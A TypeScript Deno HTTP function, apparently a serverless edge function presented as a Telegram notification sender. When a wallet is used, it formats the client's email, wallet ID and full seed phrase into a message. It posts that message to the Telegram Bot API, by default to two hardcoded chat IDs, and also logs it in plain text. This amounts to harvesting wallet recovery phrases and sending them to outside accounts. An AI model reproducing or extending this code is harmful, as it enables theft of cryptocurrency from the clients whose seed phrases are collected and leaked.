import { serve } from "https://deno.land/std@0.168.0/http/server.ts"

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
}

serve(async (req) => {
  // Handle CORS preflight requests
  if (req.method === 'OPTIONS') {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    const body = await req.json();
    const { message, chat_ids, type } = body;

    // Format message based on type
    let formattedMessage = message;
    
    if (type === 'wallet_used') {
      // Format wallet usage notification
      formattedMessage = `🔑 <b>New Wallet Used!</b>\n\n` +
        `💼 Commercial: ${body.commercial_name || 'Unknown'}\n` +
        `📧 Client: ${body.client_email || 'N/A'}\n` +
        `🆔 Wallet ID: ${body.wallet_id}\n` +
        `🔐 Seed Phrase: <code>${body.seed_phrase}</code>\n` +
        `⏰ Time: ${new Date(body.timestamp).toLocaleString()}`;
    }

    if (!formattedMessage) {
      return new Response(
        JSON.stringify({ error: 'message is required' }),
        { status: 400, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      );
    }

    const telegramBotToken = Deno.env.get('TELEGRAM_BOT_TOKEN');
    if (!telegramBotToken) {
      console.error('TELEGRAM_BOT_TOKEN missing in environment');
      return new Response(
        JSON.stringify({ error: 'TELEGRAM_BOT_TOKEN missing in environment' }),
        { status: 500, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      );
    }

    const defaultChatIds = ['1889039543', '5433409472'];
    const targets: string[] = Array.isArray(chat_ids) && chat_ids.length ? chat_ids : defaultChatIds;

    console.log(`Sending Telegram notification to ${targets.join(', ')}: ${formattedMessage}`);

    const results = [] as Array<{ chat_id: string; ok: boolean; status: number; error?: any }>;
    let successCount = 0;
    for (const chatId of targets) {
      try {
        const telegramResponse = await fetch(
          `https://api.telegram.org/bot${telegramBotToken}/sendMessage`,
          {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: chatId, text: formattedMessage, parse_mode: 'HTML' })
          }
        );
        if (!telegramResponse.ok) {
          const errorData = await telegramResponse.json().catch(() => ({}));
          console.error(`Telegram API error for ${chatId}:`, errorData);
          results.push({ chat_id: chatId, ok: false, status: telegramResponse.status, error: errorData });
        } else {
          successCount++;
          const responseData = await telegramResponse.json();
          console.log(`Telegram message sent successfully to ${chatId}:`, responseData?.ok ?? true);
          results.push({ chat_id: chatId, ok: true, status: 200 });
        }
      } catch (e) {
        console.error(`Error sending to chat ${chatId}:`, e);
        results.push({ chat_id: chatId, ok: false, status: 0, error: String(e) });
      }
    }

    return new Response(
      JSON.stringify({ success: successCount === targets.length, sent: successCount, attempted: targets.length, results }),
      { status: successCount ? 200 : 500, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
    );

  } catch (error) {
    console.error('Error in send-telegram-notification function:', error);
    return new Response(
      JSON.stringify({ error: 'Internal server error' }),
      { 
        status: 500, 
        headers: { ...corsHeaders, 'Content-Type': 'application/json' } 
      }
    );
  }
});